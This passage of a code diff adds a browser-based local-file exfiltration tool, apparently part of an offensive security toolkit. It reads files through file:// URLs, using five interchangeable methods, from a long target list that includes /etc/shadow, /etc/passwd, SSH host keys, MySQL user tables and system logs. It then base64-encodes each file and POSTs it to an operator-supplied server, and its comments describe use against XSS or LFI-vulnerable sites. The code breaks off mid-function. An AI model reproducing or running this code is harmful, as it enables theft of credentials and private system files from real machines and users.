+                                    var data = result.substr(result.search('base64,') + 'base64,'.length, result.length);
+                                    // URL-safe base64 编码（RFC 4648 §5）
+                                    data = data.replace(/\+/g, '-').replace(/\//g, '_');
+                                    callback(filename, data);
+                                } else {
+                                    log(`Empty result for ${filename}`, 'error');
+                                }
+                            }
+                            reader.onerror = function () {
+                                log(`FileReader error for ${filename}`, 'error');
+                            }
+                            reader.readAsDataURL(xhr.response);
+                        } else {
+                            log(`Failed to read ${filename} (Status: ${xhr.status})`, 'error');
+                        }
+                    };
+                    xhr.onerror = function () {
+                        log(`XHR Error reading ${filename}`, 'error');
+                    }
+                    xhr.open('GET', url);
+                    xhr.responseType = 'blob'; // 关键：将响应作为 Blob 对象
+                    xhr.send();
+                } catch (e) {
+                    log(`Exception reading ${filename}: ${e.message}`, 'error');
+                }
+            }
+
+            // ==================== PREREQUISITE VALIDATION ====================
+            
+            /**
+             * Validates prerequisites for local file access
+             * Note: These methods work in TWO scenarios:
+             * 1. file:// protocol (direct local file access)
+             * 2. Vulnerable web context (XSS/LFI) where server allows file:// URLs
+             * 
+             * Returns: { valid: boolean, errors: string[], warnings: string[] }
+             */
+            function validatePrerequisites() {
+                var result = { valid: true, errors: [], warnings: [] };
+                
+                // Check protocol - but don't block if not file:// (could be vulnerable web context)
+                var protocol = window.location.protocol;
+                if (protocol === 'file:') {
+                    result.warnings.push('Running via file:// protocol. Chrome/Edge may block XHR by default.');
+                } else {
+                    result.warnings.push('Running via ' + protocol + ' protocol. This works if server has LFI/XSS vulnerability allowing file:// URLs.');
+                }
+                
+                // Check browser support
+                if (typeof XMLHttpRequest === 'undefined' && typeof ActiveXObject === 'undefined') {
+                    result.valid = false;
+                    result.errors.push('XMLHttpRequest not available');
+                }
+                
+                if (typeof FileReader === 'undefined') {
+                    result.valid = false;
+                    result.errors.push('FileReader API not available');
+                }
+                
+                // Check Fetch API (for Method 2)
+                if (typeof fetch === 'undefined') {
+                    result.warnings.push('Fetch API not available (Method 2 will not work)');
+                }
+                
+                // Browser-specific checks (only warnings, not errors)
+                var userAgent = navigator.userAgent.toLowerCase();
+                if ((userAgent.indexOf('chrome') > -1 || userAgent.indexOf('edge') > -1) && protocol === 'file:') {
+                    result.warnings.push('Chrome/Edge: file:// XHR may be blocked. Use --allow-file-access-from-files flag, or use in vulnerable web context.');
+                }
+                
+                return result;
+            }
+
+            // ==================== METHOD 1: XHR + FileReader ====================
+            function sendGetRequestForB64File_XHR(url, filename, callback) {
+                try {
+                    var xhr = createXHR();
+                    xhr.onload = function () {
+                        if (xhr.status === 200 || xhr.status === 0) {
+                            var reader = new FileReader();
+                            reader.onloadend = function () {
+                                var result = reader.result;
+                                if (result) {
+                                    var data = result.substr(result.search('base64,') + 'base64,'.length, result.length);
+                                    data = data.replace(/\+/g, '-').replace(/\//g, '_');
+                                    callback(filename, data);
+                                } else {
+                                    log(`Empty result for ${filename}`, 'error');
+                                }
+                            };
+                            reader.onerror = function () {
+                                log(`FileReader error for ${filename}`, 'error');
+                            };
+                            reader.readAsDataURL(xhr.response);
+                        } else {
+                            log(`Failed to read ${filename} (Status: ${xhr.status})`, 'error');
+                        }
+                    };
+                    xhr.onerror = function () {
+                        log(`XHR Error reading ${filename}`, 'error');
+                    };
+                    xhr.open('GET', url);
+                    xhr.responseType = 'blob';
+                    xhr.send();
+                } catch (e) {
+                    log(`Exception reading ${filename}: ${e.message}`, 'error');
+                }
+            }
+
+            // ==================== METHOD 2: Fetch API + Blob ====================
+            function sendGetRequestForB64File_Fetch(url, filename, callback) {
+                if (typeof fetch === 'undefined') {
+                    log(`Fetch API not available for ${filename}`, 'error');
+                    return;
+                }
+                
+                fetch(url)
+                    .then(response => {
+                        if (response.status === 200 || response.status === 0) {
+                            return response.blob();
+                        }
+                        throw new Error(`HTTP ${response.status}`);
+                    })
+                    .then(blob => {
+                        var reader = new FileReader();
+                        reader.onloadend = function () {
+                            var result = reader.result;
+                            if (result) {
+                                var data = result.substr(result.search('base64,') + 'base64,'.length);
+                                data = data.replace(/\+/g, '-').replace(/\//g, '_');
+                                callback(filename, data);
+                            } else {
+                                log(`Empty result for ${filename}`, 'error');
+                            }
+                        };
+                        reader.onerror = function () {
+                            log(`FileReader error for ${filename}`, 'error');
+                        };
+                        reader.readAsDataURL(blob);
+                    })
+                    .catch(error => {
+                        log(`Fetch error for ${filename}: ${error.message}`, 'error');
+                    });
+            }
+
+            // ==================== METHOD 3: iframe + contentWindow ====================
+            function readFileViaIframe(url, filename, callback) {
+                var iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.style.width = '0';
+                iframe.style.height = '0';
+                
+                var timeout = setTimeout(function() {
+                    log(`Iframe timeout for ${filename}`, 'error');
+                    try {
+                        document.body.removeChild(iframe);
+                    } catch(e) {}
+                }, 10000); // 10 second timeout
+                
+                iframe.onload = function () {
+                    clearTimeout(timeout);
+                    try {
+                        var content = null;
+                        try {
+                            content = iframe.contentWindow.document.body.innerText ||
+                                     iframe.contentWindow.document.body.textContent;
+                        } catch (e1) {
+                            try {
+                                content = iframe.contentDocument.body.innerText ||
+                                         iframe.contentDocument.body.textContent;
+                            } catch (e2) {
+                                log(`Cannot access iframe content for ${filename}: ${e2.message}`, 'error');
+                                document.body.removeChild(iframe);
+                                return;
+                            }
+                        }
+                        
+                        if (content) {
+                            // Convert text to base64
+                            var base64 = btoa(unescape(encodeURIComponent(content)));
+                            base64 = base64.replace(/\+/g, '-').replace(/\//g, '_');
+                            callback(filename, base64);
+                        } else {
+                            log(`Empty content for ${filename}`, 'error');
+                        }
+                    } catch (e) {
+                        log(`Iframe read error for ${filename}: ${e.message}`, 'error');
+                    }
+                    try {
+                        document.body.removeChild(iframe);
+                    } catch(e) {}
+                };
+                
+                iframe.onerror = function() {
+                    clearTimeout(timeout);
+                    log(`Iframe load error for ${filename}`, 'error');
+                    try {
+                        document.body.removeChild(iframe);
+                    } catch(e) {}
+                };
+                
+                iframe.src = url;
+                document.body.appendChild(iframe);
+            }
+
+            // ==================== METHOD 4: FileReader.readAsText() ====================
+            function readFileAsText(url, filename, callback) {
+                // First get Blob via XHR
+                try {
+                    var xhr = createXHR();
+                    xhr.onload = function () {
+                        if (xhr.status === 200 || xhr.status === 0) {
+                            var reader = new FileReader();
+                            reader.onloadend = function () {
+                                var text = reader.result;
+                                if (text) {
+                                    // Convert text to base64
+                                    var base64 = btoa(unescape(encodeURIComponent(text)));
+                                    base64 = base64.replace(/\+/g, '-').replace(/\//g, '_');
+                                    callback(filename, base64);
+                                } else {
+                                    log(`Empty text result for ${filename}`, 'error');
+                                }
+                            };
+                            reader.onerror = function () {
+                                log(`FileReader readAsText error for ${filename}`, 'error');
+                            };
+                            reader.readAsText(xhr.response, 'UTF-8');
+                        } else {
+                            log(`Failed to read ${filename} (Status: ${xhr.status})`, 'error');
+                        }
+                    };
+                    xhr.onerror = function () {
+                        log(`XHR Error reading ${filename}`, 'error');
+                    };
+                    xhr.open('GET', url);
+                    xhr.responseType = 'blob';
+                    xhr.send();
+                } catch (e) {
+                    log(`Exception reading ${filename}: ${e.message}`, 'error');
+                }
+            }
+
+            // ==================== METHOD 5: FileReader.readAsArrayBuffer() ====================
+            function readFileAsArrayBuffer(url, filename, callback) {
+                // First get Blob via XHR
+                try {
+                    var xhr = createXHR();
+                    xhr.onload = function () {
+                        if (xhr.status === 200 || xhr.status === 0) {
+                            var reader = new FileReader();
+                            reader.onloadend = function () {
+                                var arrayBuffer = reader.result;
+                                if (arrayBuffer && arrayBuffer.byteLength > 0) {
+                                    // Convert ArrayBuffer to base64
+                                    var bytes = new Uint8Array(arrayBuffer);
+                                    var binary = '';
+                                    for (var i = 0; i < bytes.length; i++) {
+                                        binary += String.fromCharCode(bytes[i]);
+                                    }
+                                    var base64 = btoa(binary);
+                                    base64 = base64.replace(/\+/g, '-').replace(/\//g, '_');
+                                    callback(filename, base64);
+                                } else {
+                                    log(`Empty ArrayBuffer for ${filename}`, 'error');
+                                }
+                            };
+                            reader.onerror = function () {
+                                log(`FileReader readAsArrayBuffer error for ${filename}`, 'error');
+                            };
+                            reader.readAsArrayBuffer(xhr.response);
+                        } else {
+                            log(`Failed to read ${filename} (Status: ${xhr.status})`, 'error');
+                        }
+                    };
+                    xhr.onerror = function () {
+                        log(`XHR Error reading ${filename}`, 'error');
+                    };
+                    xhr.open('GET', url);
+                    xhr.responseType = 'blob';
+                    xhr.send();
+                } catch (e) {
+                    log(`Exception reading ${filename}: ${e.message}`, 'error');
+                }
+            }
+
+            // ==================== UNIFIED INTERFACE ====================
+            // Backward compatibility: keep original function name
+            function sendGetRequestForB64File(url, filename, callback) {
+                sendGetRequestForB64File_XHR(url, filename, callback);
+            }
+
+            var files = Array(
+                // linux files
+                '/etc/passwd',
+                '/etc/shadow',
+                '/etc/aliases',
+                '/etc/anacrontab',
+                '/var/lib/mlocate/mlocate.db',
+                '/proc/self/cmdline',
+                '/etc/apache2/apache2.conf',
+                '/etc/apache2/httpd.conf',
+                '/etc/at.allow',
+                '/etc/at.deny',
+                '/etc/bashrc',
+                '/etc/bootptab',
+                '/etc/chrootUsers',
+                '/etc/chttp.conf',
+                '/etc/cron.allow',
+                '/etc/cron.deny',
+                '/etc/crontab',
+                '/etc/cups/cupsd.conf',
+                '/etc/exports',
+                '/etc/fstab',
+                '/etc/ftpaccess',
+                '/etc/ftpchroot',
+                '/etc/ftphosts',
+                '/etc/groups',
+                '/etc/grub.conf',
+                '/etc/hosts',
+                '/etc/hosts.allow',
+                '/etc/hosts.deny',
+                '/etc/httpd/access.conf',
+                '/etc/httpd/conf/httpd.conf',
+                '/etc/httpd/httpd.conf',
+                '/etc/httpd/logs/access_log',
+                '/etc/httpd/logs/access.log',
+                '/etc/httpd/logs/error_log',
+                '/etc/httpd/logs/error.log',
+                '/etc/httpd/php.ini',
+                '/etc/httpd/srm.conf',
+                '/etc/inetd.conf',
+                '/etc/inittab',
+                '/etc/issue',
+                '/etc/lighttpd.conf',
+                '/etc/lilo.conf',
+                '/etc/logrotate.d/ftp',
+                '/etc/logrotate.d/proftpd',
+                '/etc/logrotate.d/vsftpd.log',
+                '/etc/lsb-release',
+                '/etc/motd',
+                '/etc/modules.conf',
+                '/etc/motd',
+                '/etc/mtab',
+                '/etc/my.cnf',
+                '/etc/my.conf',
+                '/etc/mysql/my.cnf',
+                '/etc/network/interfaces',
+                '/etc/networks',
+                '/etc/npasswd',
+                '/etc/passwd',
+                '/etc/php4.4/fcgi/php.ini',
+                '/etc/php4/apache2/php.ini',
+                '/etc/php4/apache/php.ini',
+                '/etc/php4/cgi/php.ini',
+                '/etc/php4/apache2/php.ini',
+                '/etc/php5/apache2/php.ini',
+                '/etc/php5/apache/php.ini',
+                '/etc/php/apache2/php.ini',
+                '/etc/php/apache/php.ini',
+                '/etc/php/cgi/php.ini',
+                '/etc/php.ini',
+                '/etc/php/php4/php.ini',
+                '/etc/php/php.ini',
+                '/etc/printcap',
+                '/etc/profile',
+                '/etc/proftp.conf',
+                '/etc/proftpd/proftpd.conf',
+                '/etc/pure-ftpd.conf',
+                '/etc/pureftpd.passwd',
+                '/etc/pureftpd.pdb',
+                '/etc/pure-ftpd/pure-ftpd.conf',
+                '/etc/pure-ftpd/pure-ftpd.pdb',
+                '/etc/pure-ftpd/putreftpd.pdb',
+                '/etc/redhat-release',
+                '/etc/resolv.conf',
+                '/etc/samba/smb.conf',
+                '/etc/snmpd.conf',
+                '/etc/ssh/ssh_config',
+                '/etc/ssh/sshd_config',
+                '/etc/ssh/ssh_host_dsa_key',
+                '/etc/ssh/ssh_host_dsa_key.pub',
+                '/etc/ssh/ssh_host_key',
+                '/etc/ssh/ssh_host_key.pub',
+                '/etc/sysconfig/network',
+                '/etc/syslog.conf',
+                '/etc/termcap',
+                '/etc/vhcs2/proftpd/proftpd.conf',
+                '/etc/vsftpd.chroot_list',
+                '/etc/vsftpd.conf',
+                '/etc/vsftpd/vsftpd.conf',
+                '/etc/wu-ftpd/ftpaccess',
+                '/etc/wu-ftpd/ftphosts',
+                '/etc/wu-ftpd/ftpusers',
+                '/logs/pure-ftpd.log',
+                '/logs/security_debug_log',
+                '/logs/security_log',
+                '/opt/lampp/etc/httpd.conf',
+                '/opt/xampp/etc/php.ini',
+                '/proc/cpuinfo',
+                '/proc/filesystems',
+                '/proc/interrupts',
+                '/proc/ioports',
+                '/proc/meminfo',
+                '/proc/modules',
+                '/proc/mounts',
+                '/proc/stat',
+                '/proc/swaps',
+                '/proc/version',
+                '/proc/self/net/arp',
+                '/root/anaconda-ks.cfg',
+                '/usr/etc/pure-ftpd.conf',
+                '/usr/lib/php.ini',
+                '/usr/lib/php/php.ini',
+                '/usr/local/apache/conf/modsec.conf',
+                '/usr/local/apache/conf/php.ini',
+                '/usr/local/apache/log',
+                '/usr/local/apache/logs',
+                '/usr/local/apache/logs/access_log',
+                '/usr/local/apache/logs/access.log',
+                '/usr/local/apache/audit_log',
+                '/usr/local/apache/error_log',
+                '/usr/local/apache/error.log',
+                '/usr/local/cpanel/logs',
+                '/usr/local/cpanel/logs/access_log',
+                '/usr/local/cpanel/logs/error_log',
+                '/usr/local/cpanel/logs/license_log',
+                '/usr/local/cpanel/logs/login_log',
+                '/usr/local/cpanel/logs/stats_log',
+                '/usr/local/etc/httpd/logs/access_log',
+                '/usr/local/etc/httpd/logs/error_log',
+                '/usr/local/etc/php.ini',
+                '/usr/local/etc/pure-ftpd.conf',
+                '/usr/local/etc/pureftpd.pdb',
+                '/usr/local/lib/php.ini',
+                '/usr/local/php4/httpd.conf',
+                '/usr/local/php4/httpd.conf.php',
+                '/usr/local/php4/lib/php.ini',
+                '/usr/local/php5/httpd.conf',
+                '/usr/local/php5/httpd.conf.php',
+                '/usr/local/php5/lib/php.ini',
+                '/usr/local/php/httpd.conf',
+                '/usr/local/php/httpd.conf.ini',
+                '/usr/local/php/lib/php.ini',
+                '/usr/local/pureftpd/etc/pure-ftpd.conf',
+                '/usr/local/pureftpd/etc/pureftpd.pdn',
+                '/usr/local/pureftpd/sbin/pure-config.pl',
+                '/usr/local/www/logs/httpd_log',
+                '/usr/local/Zend/etc/php.ini',
+                '/usr/sbin/pure-config.pl',
+                '/var/adm/log/xferlog',
+                '/var/apache2/config.inc',
+                '/var/apache/logs/access_log',
+                '/var/apache/logs/error_log',
+                '/var/cpanel/cpanel.config',
+                '/var/lib/mysql/my.cnf',
+                '/var/lib/mysql/mysql/user.MYD',
+                '/var/local/www/conf/php.ini',
+                '/var/log/apache2/access_log',
+                '/var/log/apache2/access.log',
+                '/var/log/apache2/error_log',
+                '/var/log/apache2/error.log',
+                '/var/log/apache/access_log',
+                '/var/log/apache/access.log',
+                '/var/log/apache/error_log',
+                '/var/log/apache/error.log',
+                '/var/log/apache-ssl/access.log',
+                '/var/log/apache-ssl/error.log',
+                '/var/log/auth.log',
+                '/var/log/boot',
+                '/var/htmp',
+                '/var/log/chhttp.log',
+                '/var/log/cups/error.log',
+                '/var/log/daemon.log',
+                '/var/log/debug',
+                '/var/log/dmesg',
+                '/var/log/dpkg.log',
+                '/var/log/exim_mainlog',
+                '/var/log/exim/mainlog',
+                '/var/log/exim_paniclog',
+                '/var/log/exim.paniclog',
+                '/var/log/exim_rejectlog',
+                '/var/log/exim/rejectlog',
+                '/var/log/faillog',
+                '/var/log/ftplog',
+                '/var/log/ftp-proxy',
+                '/var/log/ftp-proxy/ftp-proxy.log',
+                '/var/log/httpd/access_log',
+                '/var/log/httpd/access.log',
+                '/var/log/httpd/error_log',
+                '/var/log/httpd/error.log',
+                '/var/log/httpsd/ssl.access_log',
+                '/var/log/httpsd/ssl_log',
+                '/var/log/kern.log',
+                '/var/log/lastlog',
+                '/var/log/lighttpd/access.log',
+                '/var/log/lighttpd/error.log',
+                '/var/log/lighttpd/lighttpd.access.log',
+                '/var/log/lighttpd/lighttpd.error.log',
+                '/var/log/mail.info',
+                '/var/log/mail.log',
+                '/var/log/maillog',
+                '/var/log/mail.warn',
+                '/var/log/message',
+                '/var/log/messages',
+                '/var/log/mysqlderror.log',
+                '/var/log/mysql.log',
+                '/var/log/mysql/mysql-bin.log',
+                '/var/log/mysql/mysql.log',
+                '/var/log/mysql/mysql-slow.log',
+                '/var/log/proftpd',
+                '/var/log/pureftpd.log',
+                '/var/log/pure-ftpd/pure-ftpd.log',
+                '/var/log/secure',
+                '/var/log/vsftpd.log',
+                '/var/log/wtmp',
+                '/var/log/xferlog',
+                '/var/log/yum.log',
+                '/var/mysql.log',
+                '/var/run/utmp',
+                '/var/spool/cron/crontabs/root',
+                '/var/webmin/miniserv.log',
+                '/var/www/log/access_log',
+                '/var/www/log/error_log',
+                '/var/www/logs/access_log',
+                '/var/www/logs/error_log',
+                '/var/www/logs/access.log'
+                // android files
+                // 'databases/alipayclient.db',
+                // 'databases/alipayclient.db-journal',
+                // 'files/SGMANAGER_DATA2',
+                // 'shared_prefs/alipay_tid_storage.xml',
+                // 'shared_prefs/secuitySharedDataStore.xml'
+            );
+
+            function startExfiltration() {
+                // Validate prerequisites first (warnings only, no blocking)
+                var validation = validatePrerequisites();
+                
+                if (validation.errors.length > 0) {
+                    log('=== PREREQUISITE VALIDATION FAILED ===', 'error');
+                    validation.errors.forEach(function(error) {
+                        log('ERROR: ' + error, 'error');
+                    });
+                    log('Cannot proceed. Please fix the errors above.', 'error');
+                    return;
+                }
+                
+                // Show warnings but don't block execution
+                // Methods work in both file:// and vulnerable web contexts
+                if (validation.warnings.length > 0) {
+                    log('=== PREREQUISITE INFORMATION ===', 'info');
+                    validation.warnings.forEach(function(warning) {
+                        log('INFO: ' + warning, 'info');
+                    });
+                    log('Proceeding with exfiltration...', 'info');
+                }
+
+                const serverUrl = document.getElementById('server-url').value;
+                const method = document.getElementById('method-select').value;
+                const base_path = 'file:///';
+                let processed = 0;
+                let successCount = 0;
+                let errorCount = 0;
+
+                // Disable button during batch processing
+                var batchBtn = document.getElementById('batch-btn');
+                if (batchBtn && typeof window.i18n !== 'undefined') {
+                    batchBtn.disabled = true;
+                    batchBtn.textContent = window.i18n('localfile_batch_button_processing');
+                }
+
+                log(`Starting exfiltration to ${serverUrl}...`, 'info');
+                log(`Using method: ${method}`, 'info');
+                document.getElementById('status-text').innerText = "Running...";
+
+                // Select the appropriate read function based on method
+                var readFunction;
+                switch(method) {
+                    case 'xhr':
+                        readFunction = sendGetRequestForB64File_XHR;
+                        break;
+                    case 'fetch':
+                        readFunction = sendGetRequestForB64File_Fetch;
+                        break;
+                    case 'iframe':
+                        readFunction = readFileViaIframe;
+                        break;
+                    case 'text':
+                        readFunction = readFileAsText;
+                        break;
+                    case 'arraybuffer':
+                        readFunction = readFileAsArrayBuffer;
+                        break;
+                    default:
+                        readFunction = sendGetRequestForB64File_XHR;
+                }
+
+                files.forEach((file, index) => {
+                    setTimeout(() => {
+                        var file_path = base_path + file;
+                        log(`[${index + 1}/${files.length}] Attempting to read: ${file}`, 'info');
+
+                        readFunction(file_path, file, function (filename, response) {
+                            if (response && response.length > 0) {
+                                successCount++;
+                            log(`SUCCESS: Read ${filename} (${response.length} bytes)`, 'success');
+
+                            sendPostRequest(
+                                serverUrl,
+                                'name=' + escape(filename) + '&' + 'content=' + escape(response),
+                                { "Content-type": "application/x-www-form-urlencoded" },
+                                function (a) {
+                                    log(`Exfiltrated ${filename} to server`, 'success');
+                                }
+                            );
+                            } else {
+                                errorCount++;
+                                log(`FAILED: Empty or invalid response for ${filename}`, 'error');
+                            }
+
+                        processed++;
+                            document.getElementById('progress-text').innerText = `${processed} / ${files.length} (Success: ${successCount}, Errors: ${errorCount})`;
+
+                        if (processed === files.length) {
+                            document.getElementById('status-text').innerText = "Completed";
+                            log(`=== Exfiltration batch completed ===`, 'info');
+                            log(`Total: ${files.length}, Success: ${successCount}, Errors: ${errorCount}`, 'info');
+                            
+                            // Re-enable button
+                            var batchBtn = document.getElementById('batch-btn');
+                            if (batchBtn && typeof window.i18n !== 'undefined') {
+                                batchBtn.disabled = false;
+                                batchBtn.textContent = window.i18n('localfile_batch_button');
+                            }
+                        }
+                        });
+                    }, index * 200); // Stagger requests slightly
+                });
+            }
+
+            // ==================== TEST ALL METHODS ====================
+            function testAllMethods() {
+                var testFileInput = document.getElementById('test-file-input');
+                var testFile = testFileInput ? testFileInput.value.trim() : '/etc/hosts';
+                
+                if (!testFile || testFile === '') {
+                    var msg = (typeof window.i18n !== 'undefined') ? window.i18n('localfile_test_empty_file') : '请输入要测试的文件路径';
+                    alert(msg);
+                    return;
+                }
+
+                // Disable button during test
+                var testBtn = document.getElementById('test-all-btn');
+                if (testBtn && typeof window.i18n !== 'undefined') {
+                    testBtn.disabled = true;
+                    testBtn.textContent = window.i18n('localfile_test_button_processing');
+                }
+
+                var testUrl = 'file:///' + testFile;
+                var results = {
+                    xhr: { status: 'pending', data: null, error: null, time: null },
+                    fetch: { status: 'pending', data: null, error: null, time: null },
+                    iframe: { status: 'pending', data: null, error: null, time: null },
+                    text: { status: 'pending', data: null, error: null, time: null },
+                    arraybuffer: { status: 'pending', data: null, error: null, time: null }
+                };
+
+                log('=== Testing All Methods with ' + testFile + ' ===', 'info');
+                var testResultsDiv = document.getElementById('test-results');
+                if (testResultsDiv) {
+                    testResultsDiv.classList.add('show');
+                }
+                var testResultsContent = document.getElementById('test-results-content');
+                if (testResultsContent) {
+                    var processingText = (typeof window.i18n !== 'undefined') ? window.i18n('localfile_test_processing') : '⏳ 测试进行中，请稍候...';
+                    testResultsContent.innerHTML = '<div style="color: #3498db; padding: 20px; text-align: center;">' + processingText + '</div>';
+                }
+
+                var startTime = Date.now();
+                var completed = 0;
+                var totalMethods = 5;
+
+                function updateResults() {
+                    var i18n = (typeof window.i18n !== 'undefined') ? window.i18n : function(key) { return key; };
+                    var html = '<div style="margin-bottom: 10px; color: var(--text-secondary); font-size: 13px;">';
+                    html += '<strong>' + i18n('localfile_test_file_label_result') + '</strong><code>' + testFile + '</code>';
+                    html += '</div>';
+                    html += '<table style="width: 100%; border-collapse: collapse; margin-top: 10px;">';
+                    html += '<tr style="background: var(--border-color);"><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_method') + '</th><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_status') + '</th><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_length') + '</th><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_time') + '</th><th style="padding: 8px; text-align: left; border: 1px solid var(--border-color);">' + i18n('localfile_test_table_note') + '</th></tr>';
+                    
+                    var methods = [
+                        { key: 'xhr', name: '1. XHR + FileReader' },
+                        { key: 'fetch', name: '2. Fetch API + Blob' },
+                        { key: 'iframe', name: '3. iframe + contentWindow' },
+                        { key: 'text', name: '4. FileReader.readAsText()' },
+                        { key: 'arraybuffer', name: '5. FileReader.readAsArrayBuffer()' }
+                    ];
+
+                    methods.forEach(function(method) {
+                        var result = results[method.key];
+                        var statusColor = result.status === 'success' ? '#2ecc71' : 
+                                         result.status === 'error' ? '#e74c3c' : '#f39c12';
+                        var statusText = result.status === 'success' ? i18n('localfile_test_status_success') : 
+                                        result.status === 'error' ? i18n('localfile_test_status_error') : i18n('localfile_test_status_pending');
+                        
+                        html += '<tr>';
+                        html += '<td style="padding: 8px; border: 1px solid var(--border-color);"><strong>' + method.name + '</strong></td>';
+                        html += '<td style="padding: 8px; border: 1px solid var(--border-color); color: ' + statusColor + '; font-weight: 500;">' + statusText + '</td>';
+                        html += '<td style="padding: 8px; border: 1px solid var(--border-color);">' + (result.data ? result.data.length + i18n('localfile_test_bytes') : '-') + '</td>';
+                        html += '<td style="padding: 8px; border: 1px solid var(--border-color);">' + (result.time ? result.time + ' ms' : '-') + '</td>';
+                        html += '<td style="padding: 8px; border: 1px solid var(--border-color); font-size: 11px; color: var(--text-secondary);">' + (result.error || result.note || '-') + '</td>';
+                        html += '</tr>';
+                    });
+
+                    html += '</table>';
+
+                    // Add comparison section if all completed
+                    if (completed === totalMethods) {
+                        // Re-enable button
+                        var testBtn = document.getElementById('test-all-btn');
+                        if (testBtn && typeof window.i18n !== 'undefined') {
+                            testBtn.disabled = false;
+                            testBtn.textContent = window.i18n('localfile_test_button');
+                        }
+                        var successCount = 0;
+                        var errorCount = 0;
+                        for (var key in results) {
+                            if (results[key].status === 'success') successCount++;
+                            if (results[key].status === 'error') errorCount++;
+                        }
+
+                        html += '<div style="margin-top: 20px; padding: 15px; background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 4px;">';
+                        html += '<h4 style="margin-top: 0;">' + i18n('localfile_test_summary_title') + '</h4>';
+                        html += '<p><strong>' + i18n('localfile_test_summary_success') + '</strong> <span style="color: #2ecc71;">' + successCount + ' / ' + totalMethods + '</span></p>';
+                        html += '<p><strong>' + i18n('localfile_test_summary_failed') + '</strong> <span style="color: #e74c3c;">' + errorCount + ' / ' + totalMethods + '</span></p>';
+                        
+                        // Show recommendation
+                        if (successCount > 0) {
+                            var recommendedMethods = [];
+                            methods.forEach(function(method) {
+                                if (results[method.key].status === 'success') {
+                                    var methodName = method.name.split('.')[1].trim();
+                                    recommendedMethods.push(methodName);
+                                }
+                            });
+                            html += '<p style="margin-top: 10px;"><strong>' + i18n('localfile_test_recommended') + '</strong> ' + recommendedMethods.join(', ') + '</p>';
+                        }
+                        
+                        // Check if all successful methods return same data
+                        var successfulData = [];
+                        for (var key in results) {
+                            if (results[key].status === 'success' && results[key].data) {
+                                successfulData.push({ method: key, data: results[key].data });
+                            }
+                        }
+                        
+                        if (successfulData.length > 1) {
+                            var allSame = true;
+                            var firstData = successfulData[0].data;
+                            for (var i = 1; i < successfulData.length; i++) {
+                                if (successfulData[i].data !== firstData) {
+                                    allSame = false;
+                                    break;
+                                }
+                            }
+                            html += '<p style="margin-top: 10px;"><strong>' + i18n('localfile_test_consistency') + '</strong> ' + (allSame ? '<span style="color: #2ecc71;">' + i18n('localfile_test_consistency_same') + '</span>' : '<span style="color: #e74c3c;">' + i18n('localfile_test_consistency_diff') + '</span>') + '</p>';
+                        }
+
+                        html += '</div>';
+                    }
+
+                    var testResultsContent = document.getElementById('test-results-content');
+                    if (testResultsContent) {
+                        testResultsContent.innerHTML = html;
+                    }
+                }
+
+                // Test Method 1: XHR
+                (function() {
+                    var methodStart = Date.now();
+                    try {
+                        sendGetRequestForB64File_XHR(testUrl, testFile, function(filename, data) {
+                            results.xhr.status = 'success';
+                            results.xhr.data = data;
+                            results.xhr.time = Date.now() - methodStart;
+                            results.xhr.note = 'Read successfully';
+                            completed++;
+                            log('Method 1 (XHR): SUCCESS - ' + data.length + ' bytes', 'success');
+                            updateResults();
+                        });
+                        // Set timeout for XHR
+                        setTimeout(function() {
+                            if (results.xhr.status === 'pending') {
+                                results.xhr.status = 'error';
+                                results.xhr.error = 'Timeout (10s)';
+                                results.xhr.time = Date.now() - methodStart;
+                                completed++;
+                                log('Method 1 (XHR): TIMEOUT', 'error');
+                                updateResults();
+                            }
+                        }, 10000);
+                    } catch (e) {
+                        results.xhr.status = 'error';
+                        results.xhr.error = e.message;
+                        results.xhr.time = Date.now() - methodStart;
+                        completed++;
+                        log('Method 1 (XHR): ERROR - ' + e.message, 'error');
+                        updateResults();
+                    }
+                })();
+
+                // Test Method 2: Fetch
+                (function() {
+                    var methodStart = Date.now();
+                    if (typeof fetch === 'undefined') {
+                        results.fetch.status = 'error';
+                        results.fetch.error = 'Fetch API not available';
+                        results.fetch.time = 0;
+                        completed++;
+                        log('Method 2 (Fetch): ERROR - Fetch API not available', 'error');
+                        updateResults();
+                        return;
+                    }
+                    try {
+                        sendGetRequestForB64File_Fetch(testUrl, testFile, function(filename, data) {
+                            results.fetch.status = 'success';
+                            results.fetch.data = data;
+                            results.fetch.time = Date.now() - methodStart;
+                            results.fetch.note = 'Read successfully';
+                            completed++;
+                            log('Method 2 (Fetch): SUCCESS - ' + data.length + ' bytes', 'success');
+                            updateResults();
+                        });
+                        setTimeout(function() {
+                            if (results.fetch.status === 'pending') {
+                                results.fetch.status = 'error';
+                                results.fetch.error = 'Timeout (10s)';
+                                results.fetch.time = Date.now() - methodStart;
+                                completed++;
+                                log('Method 2 (Fetch): TIMEOUT', 'error');
+                                updateResults();
+                            }
+                        }, 10000);
+                    } catch (e) {
+                        results.fetch.status = 'error';
+                        results.fetch.error = e.message;
+                        results.fetch.time = Date.now() - methodStart;
+                        completed++;
+                        log('Method 2 (Fetch): ERROR - ' + e.message, 'error');
+                        updateResults();
+                    }
+                })();
+
+                // Test Method 3: iframe
+                (function() {
+                    var methodStart = Date.now();
+                    try {
+                        readFileViaIframe(testUrl, testFile, function(filename, data) {
+                            results.iframe.status = 'success';
+                            results.iframe.data = data;
+                            results.iframe.time = Date.now() - methodStart;
+                            results.iframe.note = 'Read successfully (text only)';
+                            completed++;
+                            log('Method 3 (iframe): SUCCESS - ' + data.length + ' bytes', 'success');
+                            updateResults();
+                        });
+                        setTimeout(function() {
+                            if (results.iframe.status === 'pending') {
+                                results.iframe.status = 'error';
+                                results.iframe.error = 'Timeout (10s) or blocked by browser';
+                                results.iframe.time = Date.now() - methodStart;
+                                completed++;
+                                log('Method 3 (iframe): TIMEOUT or BLOCKED', 'error');
+                                updateResults();
+                            }
+                        }, 10000);
+                    } catch (e) {
+                        results.iframe.status = 'error';
+                        results.iframe.error = e.message;
+                        results.iframe.time = Date.now() - methodStart;
+                        completed++;
+                        log('Method 3 (iframe): ERROR - ' + e.message, 'error');
+                        updateResults();
+                    }
+                })();
+
+                // Test Method 4: readAsText
+                (function() {
+                    var methodStart = Date.now();
+                    try {
+                        readFileAsText(testUrl, testFile, function(filename, data) {
